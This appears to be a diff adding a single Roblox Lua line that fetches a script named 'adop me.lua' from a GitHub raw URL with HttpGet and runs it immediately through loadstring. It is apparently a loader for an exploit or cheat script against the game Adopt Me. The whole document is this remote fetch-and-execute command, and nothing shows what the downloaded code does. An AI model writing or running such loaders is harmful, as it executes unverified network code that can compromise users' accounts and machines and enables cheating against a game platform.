@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hiklom/hikka/main/adop%20me.lua"))()
